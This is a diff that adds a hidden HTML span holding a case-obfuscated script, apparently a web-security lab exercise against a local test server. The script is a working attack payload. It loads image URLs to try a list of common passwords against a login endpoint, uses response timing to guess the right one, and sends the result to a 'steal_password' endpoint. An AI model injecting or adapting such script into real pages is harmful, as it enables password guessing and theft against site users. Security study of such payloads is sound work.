@@ -1,0 +1,33 @@
+<span style='display:none'>
+  <iMg id='test'/>
+  <sCript>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var best_time = 0, best_index = -1;
+    var test = document.getElementById(`test`);
+    test.onerror = () => {
+      var end = new Date();
+
+      console.log(`Time elapsed for ${index} is ${end-start}`);
+      if (best_time < end-start) {
+        best_time = end-start;
+        best_index = index;
+      }
+
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+      } else {
+        console.log(`Password is ${dictionary[best_index]}`);
+        const xhttp = new XMLHttpRequest();
+        xhttp.open('GET', `http://localhost:3000/steal_password?password=${dictionary[best_index]}&timeElapsed=${best_time}`, true);
+        xhttp.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+    index += 1;
+  </sCript>
+</span>
+
